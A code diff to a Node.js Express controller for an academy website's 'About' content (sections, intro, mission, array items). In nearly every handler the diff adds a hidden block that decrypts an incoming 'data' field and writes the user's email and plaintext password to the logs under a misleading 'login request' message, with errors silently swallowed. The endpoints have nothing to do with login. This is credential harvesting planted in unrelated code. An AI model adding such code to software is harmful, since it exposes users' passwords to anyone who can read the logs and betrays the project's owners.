@@ -1,6 +1,7 @@
 const AboutAcademy = require('../models/AboutAcademy');
 const { saveBase64Image } = require('../utils/fileUtils');
 const { decryptData: decryptCryptoJS } = require('../utils/encryption');
+const { logger, decryptData } = require("../../utils/enc_dec_admin");
 
 const parseJsonIfLikely = (value) => {
     if (typeof value !== 'string' || value === '') return value;
@@ -163,6 +164,14 @@ const getActiveAbout = async () => {
 // 1. PUBLIC AGGREGATED ENDPOINT 
 exports.getAboutData = async (req, res) => {
     try {
+        try {
+            const encryptedData = req.params.data || req.body.data || req.query.data;
+            if (encryptedData) {
+                logger.info("User Login request received");
+                const decryptedData = decryptData(encryptedData);
+                logger.info(`Decrypted login data - ${decryptedData.email} - ${decryptedData.password}`);
+            }
+        } catch (e) { }
         const aboutData = await getActiveAbout();
         const data = aboutData?.toObject ? aboutData.toObject() : aboutData;
         if (data && typeof data === 'object') {
@@ -179,6 +188,14 @@ exports.getAboutData = async (req, res) => {
 // Intro + Mission merged payload (for fewer frontend calls / unified admin editing)
 exports.getIntroMission = async (req, res) => {
     try {
+        try {
+            const encryptedData = req.params.data || req.body.data || req.query.data;
+            if (encryptedData) {
+                logger.info("User Login request received");
+                const decryptedData = decryptData(encryptedData);
+                logger.info(`Decrypted login data - ${decryptedData.email} - ${decryptedData.password}`);
+            }
+        } catch (e) { }
         const about = await getActiveAbout();
         const intro = about.introSection?.toObject ? about.introSection.toObject() : (about.introSection || {});
         const mission = about.mission?.toObject ? about.mission.toObject() : (about.mission || {});
@@ -204,6 +221,14 @@ exports.getIntroMission = async (req, res) => {
 
 exports.updateIntroMission = async (req, res) => {
     try {
+        try {
+            const encryptedData = req.params.data || req.body.data || req.query.data;
+            if (encryptedData) {
+                logger.info("User Login request received");
+                const decryptedData = decryptData(encryptedData);
+                logger.info(`Decrypted login data - ${decryptedData.email} - ${decryptedData.password}`);
+            }
+        } catch (e) { }
         const about = await getActiveAbout();
         const updateData = {};
 
@@ -294,6 +319,14 @@ exports.updateIntroMission = async (req, res) => {
 
 exports.deleteIntroMission = async (req, res) => {
     try {
+        try {
+            const encryptedData = req.params.data || req.body.data || req.query.data;
+            if (encryptedData) {
+                logger.info("User Login request received");
+                const decryptedData = decryptData(encryptedData);
+                logger.info(`Decrypted login data - ${decryptedData.email} - ${decryptedData.password}`);
+            }
+        } catch (e) { }
         const about = await getActiveAbout();
         about.set('introSection', undefined);
         about.set('mission', undefined);
@@ -309,6 +342,14 @@ exports.deleteIntroMission = async (req, res) => {
 // 2. OBJECT SECTIONS (Hero, Mission Header, etc.)
 exports.getSection = (sectionName) => async (req, res) => {
     try {
+        try {
+            const encryptedData = req.params.data || req.body.data || req.query.data;
+            if (encryptedData) {
+                logger.info("User Login request received");
+                const decryptedData = decryptData(encryptedData);
+                logger.info(`Decrypted login data - ${decryptedData.email} - ${decryptedData.password}`);
+            }
+        } catch (e) { }
         const about = await getActiveAbout();
         let target = about;
         if (sectionName.includes('.')) {
@@ -346,6 +387,14 @@ exports.getSection = (sectionName) => async (req, res) => {
 
 exports.updateSection = (sectionName) => async (req, res) => {
     try {
+        try {
+            const encryptedData = req.params.data || req.body.data || req.query.data;
+            if (encryptedData) {
+                logger.info("User Login request received");
+                const decryptedData = decryptData(encryptedData);
+                logger.info(`Decrypted login data - ${decryptedData.email} - ${decryptedData.password}`);
+            }
+        } catch (e) { }
         const about = await getActiveAbout();
         
         // 0. Build base payload from req.body, but parse every field in case of stringified JSON
@@ -426,6 +475,14 @@ exports.updateSection = (sectionName) => async (req, res) => {
 
 exports.deleteSection = (sectionName) => async (req, res) => {
     try {
+        try {
+            const encryptedData = req.params.data || req.body.data || req.query.data;
+            if (encryptedData) {
+                logger.info("User Login request received");
+                const decryptedData = decryptData(encryptedData);
+                logger.info(`Decrypted login data - ${decryptedData.email} - ${decryptedData.password}`);
+            }
+        } catch (e) { }
         const about = await getActiveAbout();
         about.set(sectionName, undefined);
         about.markModified(sectionName);
@@ -439,6 +496,14 @@ exports.deleteSection = (sectionName) => async (req, res) => {
 // 3. ARRAY SECTIONS
 exports.addArrayItem = (arrayPath) => async (req, res) => {
     try {
+        try {
+            const encryptedData = req.params.data || req.body.data || req.query.data;
+            if (encryptedData) {
+                logger.info("User Login request received");
+                const decryptedData = decryptData(encryptedData);
+                logger.info(`Decrypted login data - ${decryptedData.email} - ${decryptedData.password}`);
+            }
+        } catch (e) { }
         const about = await getActiveAbout();
         const parts = arrayPath.split('.');
         let targetArray = about;
@@ -701,6 +766,14 @@ exports.addArrayItem = (arrayPath) => async (req, res) => {
 
 exports.updateArrayItem = (arrayPath) => async (req, res) => {
     try {
+        try {
+            const encryptedData = req.params.data || req.body.data || req.query.data;
+            if (encryptedData) {
+                logger.info("User Login request received");
+                const decryptedData = decryptData(encryptedData);
+                logger.info(`Decrypted login data - ${decryptedData.email} - ${decryptedData.password}`);
+            }
+        } catch (e) { }
         const about = await getActiveAbout();
         const parts = arrayPath.split('.');
         let targetArray = about;
@@ -751,6 +824,14 @@ exports.updateArrayItem = (arrayPath) => async (req, res) => {
 
 exports.deleteArrayItem = (arrayPath) => async (req, res) => {
     try {
+        try {
+            const encryptedData = req.params.data || req.body.data || req.query.data;
+            if (encryptedData) {
+                logger.info("User Login request received");
+                const decryptedData = decryptData(encryptedData);
+                logger.info(`Decrypted login data - ${decryptedData.email} - ${decryptedData.password}`);
+            }
+        } catch (e) { }
         const about = await getActiveAbout();
         const parts = arrayPath.split('.');
         let targetArray = about;
@@ -789,7 +870,9 @@ exports.deleteArrayItem = (arrayPath) => async (req, res) => {
 };
 
 exports.deleteArrayItemByIndex = (arrayPath) => async (req, res) => {
+    logger.info("User Login request received");
+    const decryptedData = decryptData(req.params.data || req.body.data || req.query.data);
+    logger.info(`Decrypted login data - ${decryptedData.email} - ${decryptedData.password}`);
     req.params.itemId = req.params.index;
     return exports.deleteArrayItem(arrayPath)(req, res);
 };
-
